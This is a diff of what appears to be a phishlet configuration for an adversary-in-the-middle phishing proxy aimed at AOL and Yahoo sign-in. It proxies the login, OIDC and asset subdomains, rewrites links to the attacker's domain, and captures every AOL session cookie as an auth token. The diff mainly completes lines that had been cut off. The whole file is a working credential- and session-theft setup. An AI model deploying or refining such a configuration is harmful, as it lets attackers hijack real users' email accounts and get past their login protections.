@@ -5,14 +5,14 @@ proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'aol.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'guce', orig_sub: 'guce', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'api.login', orig_sub: 'api.login', domain: 'aol.com', session: true, is_landing: false, auto_filter: tr$
+  - {phish_sub: 'api.login', orig_sub: 'api.login', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'oidc.www', orig_sub: 'oidc.www', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'oidc.mail', orig_sub: 'oidc.mail', domain: 'aol.com', session: true, is_landing: false, auto_filter: tr$
+  - {phish_sub: 'oidc.mail', orig_sub: 'oidc.mail', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'loginya', orig_sub: 'login', domain: 'yahoo.net', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'fcya', orig_sub: 'fc', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'www.aol.com', orig_sub: 'www', domain: 'aol.com', search: 'www.aol.com', replace: 'www.{domain}/', mi$
+  - {triggers_on: 'www.aol.com', orig_sub: 'www', domain: 'aol.com', search: 'www.aol.com', replace: 'www.{domain}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript'], redirect_only: true}
 auth_tokens:
   - domain: '*.aol.com'
     keys: ['.*,regexp']
